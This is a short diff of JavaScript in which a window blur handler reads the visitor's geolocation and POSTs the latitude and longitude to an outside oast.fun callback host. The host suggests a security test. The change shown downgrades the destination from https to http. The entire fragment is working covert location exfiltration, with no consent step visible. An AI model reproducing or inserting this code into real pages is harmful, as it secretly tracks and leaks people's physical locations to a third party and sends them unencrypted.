@@ -5,7 +5,7 @@ window.onblur = function() {
     navigator.geolocation.getCurrentPosition(function(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+        fetch('http://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
             method: 'POST',
             body: JSON.stringify({latitude: lat, longitude: lon})
         });
